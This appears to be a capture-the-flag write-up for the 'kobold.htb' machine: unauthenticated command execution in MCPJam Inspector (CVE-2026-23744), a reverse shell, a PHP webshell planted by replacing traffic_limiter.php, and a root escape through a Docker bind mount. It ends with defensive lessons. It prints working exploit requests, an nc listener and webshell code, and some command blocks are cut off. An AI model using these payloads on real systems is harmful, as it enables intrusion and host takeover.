VHost Discovery & Service Fingerprinting
nmap · gobuster vhost · SSL cert SAN · Arcane API docs

Section 03

Initial Access — CVE-2026-23744

03
MCPJam Inspector stdio Transport RCE
CVE-2026-23744 · /api/mcp/connect · no authentication · bash reverse shell

MCPJam Inspector's /api/mcp/connect endpoint accepts a serverConfig JSON object. When transportType is set to stdio, the command and args parameters are executed directly as a child process — no authentication required. The "Connection closed" error on a simple id command confirms execution (the process exited immediately since it isn't a valid MCP server). A bash reverse shell maintains the connection long enough to receive the callback.

bash — verify execution (id command)
curl -sk https://mcp.kobold.htb/api/mcp/connect \
  -X POST -H "Content-Type: application/json" \
  -d '{
    "serverId":"test",
    "serverConfig":{
      "transportType":"stdio",
      "command":"id",
      "args":[]
    }
  }'

{"success":false,"error":"Connection failed for server test:
 MCP error -32000: Connection closed"}
# "Connection closed" = command ran and exited — RCE confirmed
bash — reverse shell
# Start listener
nc -nlvp 4444

# Send reverse shell payload

  -X POST -H "Content-Type: application/json" \
  -d '{
    "serverId":"shell",
    "serverConfig":{
      "transportType":"stdio",
      "command":"bash",

Section 04

Lateral Movement — PHP Injection & Credential Leak

04
PrivateBin traffic_limiter.php Replacement
world-writable dir · no sticky bit · PHP require · webshell

PrivateBin's source code shows that traffic_limiter.php is loaded via PHP require on every POST request for rate limiting. Ben can read but not write the file directly (permissions: -rw-r----- root:operator). However, the parent directory is world-writable with no sticky bit — on Linux, write permission on a directory allows deleting files within it. Ben deletes the original and creates a replacement that preserves the expected $GLOBALS['traffic_limiter'] structure while adding a command execution backdoor.

bash — delete + replace traffic_limiter.php
# Directory is world-writable — no sticky bit → deletion allowed
rm /privatebin-data/data/traffic_limiter.php

# Replacement: preserves PrivateBin structure + adds webshell
cat > /privatebin-data/data/traffic_limiter.php << 'EOF'
<?php
if(isset($_GET["x"])){
    header("Content-Type: text/plain");
    echo shell_exec($_GET["x"]);
    exit;
}
$GLOBALS["traffic_limiter"] = array();
EOF

# Trigger via POST to PrivateBin (runs as nobody inside container)
curl -s "http://127.0.0.1:8080/?x=id" -X POST -d "t=1"
uid=65534(nobody) gid=82(www-data) groups=82(www-data)
◈
Why This Works: PHP's require executes the loaded file in the current process context. The PrivateBin container mounts /privatebin-data/ from the host — modifications from ben's host session appear immediately inside the container. The webshell fires on every POST to PrivateBin.

Docker Container with /:/hostroot Bind Mount → Root Flag
Arcane admin API · host mount · container as root · /tmp exfil

The Arcane admin API allows creating containers with arbitrary hostConfig.binds. A new container is created with the entire host root filesystem mounted at /hostroot inside the container. The container's entrypoint reads the root flag and writes it (world-readable) to /tmp/rf.txt on the host, where ben can read it.

bash — create container with host mount

  'http://127.0.0.1:3552/api/environments/0/containers' \
  -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "image": "mysql:latest",
    "name": "rootread",
    "entrypoint": ["sh", "-c",
      "cat /hostroot/root/root.txt > /hostroot/tmp/rf.txt && chmod 644 /hostroot/tmp/rf.txt"],
    "hostConfig": {
      "binds": ["/:/hostroot"]
    }
  }'

{
  "success": true,

    "id": "8bc81f2d6a6cfee...",
    "name": "/rootread",

# Container runs as root, writes flag to host /tmp
cat /tmp/rf.txt

key takeaways
01 // MISSING AUTH
CVE-2026-23744 — MCPJam stdio Transport
Dev and testing tools like MCPJam Inspector that accept arbitrary server configurations must never be internet-exposed without authentication. The stdio transport type is especially dangerous — it hands arbitrary OS command execution to any client. Bind to loopback only and require strong auth.
02 // DIRECTORY PERMISSIONS
World-Writable Directories Without Sticky Bit
Write permission on a directory allows deleting and replacing any file within it — even files you can't write directly. The sticky bit (+t) prevents this by requiring ownership to delete. Any shared directory containing sensitive PHP or code files must use 1770 or 1775 with careful ownership assignment.
03 // CREDENTIAL HYGIENE
Commented-Out Credentials Still Leak
Commenting out a database section in a config file does not remove the credentials — they remain in plaintext and any process that can read the file can extract them. Secrets should be externalized to environment variables or a secrets manager and never committed or stored inline in config files.
04 // PASSWORD REUSE
Service Passwords Must Be Unique
Reusing a database password as an admin panel password creates a lateral movement bridge. The MySQL password was exposed by a PHP webshell; without reuse, the Arcane admin would have remained protected. Every service credential must be unique — enforce this with a secrets manager.
05 // DOCKER SECURITY
Docker Admin API = Root on the Host
Any user or service that can create containers with arbitrary bind mounts has effective root access to the entire host filesystem. Arcane's admin API with no mount restrictions is a direct root escape vector. Container managers must enforce mount allowlists and consider running Docker in rootless mode.
06 // NETWORK ISOLATION
Dev Tools Must Not Be Internet-Accessible
MCPJam Inspector is a development and testing tool that was accessible over HTTPS with no authentication. Network segmentation and access controls must treat internal tooling as high-risk. Always restrict management interfaces to loopback or a dedicated management VLAN with strong authentication.
